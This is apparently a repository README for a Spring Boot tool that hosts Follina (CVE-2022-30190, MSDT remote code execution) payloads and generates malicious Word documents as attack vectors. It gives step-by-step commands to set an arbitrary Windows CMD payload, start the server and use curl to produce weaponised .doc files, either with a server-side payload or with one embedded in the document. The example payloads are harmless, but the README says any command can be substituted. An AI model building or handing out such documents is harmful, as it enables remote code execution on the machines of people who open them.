# Follina MS-MSDT exploitation with Spring Boot

This repository contains a simple **Spring Boot** application that acts both as a server to **host/activate Follina payloads**, and as a **generator for malicious Word documents** that are ready to be used as attack vectors to exploit [CVE-2022-30190](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30190).

This vulnerability consists of **Remote Code Execution** through MSDT *(Microsoft Windows Support Diagnostic Tool)*.

## Server-Side Payload

In order to serve a unique payload of your choice, you should:

- define the **payload**, eg.:
```
export FOLLINA_PAYLOAD="notepad.exe"
```
- run the **server** to host the static payload:
```
mvn spring-boot:run
```
- generate the "Follina" **Word document**:
```
curl -s http://localhost:8080/generateDoc?address=http://192.168.64.128:8080 -o follina.doc
```

**If you'd like to change the current payload, you'd have to tear down the currently active server first**, and repeat the steps after defining the newer payload.

**NOTE:** the payload can be replaced with whatever other command, as long as it can be run via the Windows CMD.


## Client-Side Payload

In order to serve a client-side payload of your choice, you should:

- run the **server** to activate the payloads at runtime:
```
mvn spring-boot:run
```
- generate the "Follina" **Word document** specifying the `cmd` query parameter, eg.:
```
curl -sG http://localhost:8080/generateDoc --data-urlencode 'address=http://192.168.64.128:8080' --data-urlencode 'cmd=start msedge.exe https://www.youtube.com/watch?v=zqTwOoElxBA' -o follina.doc
```

**The payload in this case is embedded within the document**, and will simply need *activation* by contacting the server. In this way, you can have multiple different payloads spread over different documents and you won't have to reboot the server to trigger payload changes - as you can simply generate a new document with the desired payload embedded.

### Kudos
Many thanks to [John Hammond](https://github.com/JohnHammond/msdt-follina) for coming out with the Python implementation, and sharing his analysis of the CVE.
